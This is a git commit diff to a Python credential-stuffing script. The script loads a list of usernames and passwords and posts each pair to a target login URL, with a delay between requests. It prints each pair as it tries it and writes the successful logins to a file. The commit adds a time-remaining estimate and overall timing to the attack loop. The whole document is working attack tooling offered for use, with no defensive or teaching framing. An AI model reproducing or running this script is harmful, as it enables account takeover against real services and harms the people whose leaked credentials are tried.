a199b0cd50a9b3d4147e0b73b08f0cf8808cb867
nemo <jonathonrschnell@gmail.com>
2021-01-14 16:48:34 -0800

    keeps track of time remaining, misc time metrics

--- stuff.py
+++ stuff.py
@@ -20,15 +20,21 @@ credentials = json.load(open('credentials.json'))
 print('Starting attack on ' + requestURL)
 
 sucessList = []
+counter = 0
+numCreds = (len(credentials))
+startTime = time.perf_counter()
+
+
 
 #post each credential
 for credential in credentials:
-    print("stuffing " + credential["username"] + ' : ' + credential['password'] + "...")
+    print("stuffing " + credential["username"] + ' : ' + credential['password'] + "\t\t time remaining: " + str((numCreds-counter)*requestDelay) + " seconds")
     credObj = {
         formUsernameIdentifier: credential['username'],
         formPassworodIdentifier: credential['password']
     }
     response = requests.post(requestURL, allow_redirects=False, json=credObj)
+    counter = counter + 1
     #server response 200 ok
     if response.status_code == requests.codes.ok:
     	print('response: ' + response.text)
@@ -45,6 +51,9 @@ for credential in credentials:
     time.sleep(requestDelay)
 
 #write sucessful creds to a file in json format
+finishTime = time.perf_counter()
+seconds = finishTime - startTime
+print(str(counter) + " credentials stuffed in " + str(seconds) + " seconds")
 print("writing suceffuly stuffed credentials to sucess.json\nexiting...")
 outFile = open('sucess.json', 'w', encoding='utf-8')
 json.dump(sucessList, outFile, ensure_ascii=False, indent=4)
